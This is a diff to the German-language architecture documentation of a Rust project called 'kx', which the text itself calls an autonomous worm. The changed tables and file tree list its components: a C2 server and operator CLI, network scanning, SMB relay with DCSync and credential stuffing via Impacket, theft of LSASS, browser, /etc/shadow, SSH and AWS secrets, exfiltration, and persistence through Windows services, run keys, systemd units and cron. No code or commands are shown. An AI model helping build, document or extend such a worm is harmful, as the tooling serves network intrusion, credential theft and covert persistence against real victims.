@@ -140,14 +140,14 @@ schreiben ihre Fehler nach stdout.
 
 | Crate        | Aufgabe                                              |
 |--------------|------------------------------------------------------|
-| `kx-core`    | C2-Protokoll (`c2`) samt Transport, Kryptografie (`hostkey`, `secretbox`), die Formen der Beute (`secret`, `exfil`), die Persistenz-Invocation (`persist`), KXENC-Dateiformat, Hilfsfunktionen (`util`) |
+| `kx-core`    | C2-Protokoll (`c2`) samt Transport, Kryptografie (`hostkey`, `secretbox`), die Formen der Beute (`secret`, `exfil`), die Persistenz-Invocation (`persist`), KXENC-Dateiformat (`format`), Textkodierungen (`codec`), Schlüsselarten (`kex`) |
 | `kx-scanner` | ARP-Hostentdeckung (`arp_sweep`), TCP-Portscan (`scan_tcp`), `fingerprint` |
 | `kx-exploit` | SMB-Relay (`smb_relay_dcsync`), Credential-Stuffing (`try_default_credentials`) via Impacket |
 | `kx-win`     | Windows-Secrets (LSASS, Credential Manager, Browser) + Persistenz (Dienst, Run-Key, Scheduled Task) |
 | `kx-posix`   | POSIX-Secrets (`/etc/shadow`, SSH, AWS) + Persistenz (systemd-Unit, Cron) |
 | `kx-tls`     | selbstsignierte Zertifikate (`generate_server_tls`), rustls-Configs (`client_config_trusting`) — die Client-Konfiguration nutzt der Transport in `kx-core` |
-| `kx-server`  | C2-Backend: axum-API, SQLite (`hosts`, `secrets`, `tasks`), HTML-Dashboard |
-| `kx-agent`   | der autonome Wurm: orchestriert Scanner → Exploit → Secrets → Persistenz → C2-Report |
+| `kx-server`  | C2-Backend: axum-API, SQLite (`hosts`, `secrets`, `tasks`), HTML-Dashboard — Bibliothek (`lib.rs`) **und** Binary (`main.rs`) |
+| `kx-agent`   | der autonome Wurm: orchestriert Scanner → Exploit → Secrets → Persistenz → C2-Report; der Lauf liegt in `lauf.rs`, die Meldung in `meldung.rs` |
 | `kx-cli`     | Operator-CLI (`hosts`, `secrets`, `export --format json|csv`, `tasks`) |
 
 Schichtung: `kx-core` und `kx-scanner` sind Basislagen; `kx-core` bindet seit
@@ -311,15 +311,15 @@ kx/
 ├── assets/              # smbrelayx.py (Impacket, Apache-Lizenz)
 ├── HANDOFF.md              # Übergabenotiz zum Arbeitsstand
 └── crates/
-    ├── kx-core/            # c2.rs (C2 Protocol), transport.rs, secret.rs, exfil.rs, persist.rs, hostkey.rs, secretbox.rs, format.rs, error.rs, util.rs
+    ├── kx-core/            # c2.rs (C2 Protocol), transport.rs, secret.rs, exfil.rs, persist.rs, hostkey.rs, secretbox.rs, format.rs, error.rs, codec.rs, kex.rs
     ├── kx-scanner/         # arp.rs (nur Linux), tcp_scan.rs, fingerprint.rs
-    ├── kx-exploit/         # smb_relay.rs, credential_stuff.rs, payload.rs, examples/
+    ├── kx-exploit/         # smb_relay.rs, smbrelayx.rs, credential_stuff.rs, payload.rs, examples/
     ├── kx-win/             # secrets.rs, persist.rs
     ├── kx-posix/           # secrets.rs, persist.rs
     ├── kx-tls/             # lib.rs (rustls/rcgen)
-    ├── kx-server/          # main.rs, auth.rs, db.rs, dashboard.rs, e2e_test.rs
-    ├── kx-agent/           # main.rs, propagate.rs, c2.rs, tasks.rs, hostkey.rs
-    └── kx-cli/             # main.rs, client.rs
+    ├── kx-server/          # lib.rs, main.rs, auth.rs, db.rs, dashboard.rs, e2e_test.rs, tests/vertrag.rs
+    ├── kx-agent/           # main.rs, lauf.rs, meldung.rs, propagate.rs, c2.rs, tasks.rs, hostkey.rs
+    └── kx-cli/             # main.rs, client.rs, decrypt.rs
 ```
 
 Jedes Crate hat eine `README.md`, die Module haben eine `README.md` in `src/` —
